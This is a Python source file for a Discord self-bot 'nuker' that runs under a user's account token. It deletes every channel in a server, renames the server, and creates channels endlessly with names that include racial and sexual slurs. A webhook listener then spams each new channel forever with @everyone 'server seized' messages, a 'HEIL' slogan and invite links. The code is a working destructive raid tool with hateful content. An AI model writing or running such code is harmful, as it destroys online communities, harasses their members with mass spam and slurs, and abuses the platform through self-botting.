# ────── Intents ────── #

# Import
import discord
from discord.ext import commands
import sys, os
from colorama import Fore as C
import random
import asyncio
import threading
from asyncio import tasks
import requests

# Menu
token = input(f'{C.RED}Enter your token:  {C.WHITE}')
kkt = commands.Bot(command_prefix="^",self_bot=True,help_command=None)

# Presence
@kkt.event
async def on_ready():
    await kkt.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name="fail"))

# ────── Commands ────── #

channels = ["heil-theo", "oopsie-fingers-slipped", "kaboomed-by-me", "surrender", "get-sexed", "go-crying", "die-niggers", "kkt-rules-you"]

# Nuke
@kkt.command()
async def nuke(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  await guild.edit(name="｢ЖƬ｣ Nuked by Theo")  
  await cdel(ctx)
  await cbomb(ctx)

# Cbomb
@kkt.command()
async def cbomb(ctx):
    while True:
        guild = ctx.guild
        await guild.create_text_channel(random.choice(channels))

# Cdel
@kkt.command()
async def cdel(ctx):
    for c in ctx.guild.channels:
        try:
            await c.delete()
        except:
            pass 

# Webhookspam
@kkt.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="RAPED BY THEO")
    try:
        while True:
            await webhook.send(""" 
```SERVER SEIZED BY THEO / HEIL KROWNED KNIGHTS OF THEOPIA```
@everyone
░░░███████ ]▄▄▄▄▄▄▄▄ 
▂▄▅████████▅▄▃▂
I███████████████████]
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
https://media.discordapp.net/attachments/1011644934220165312/1013450834182414417/kkt_glitch.gif
https://discord.gg/tmVwMhtWJt
""")
    except:
        pass

kkt.run(token, bot=False)    
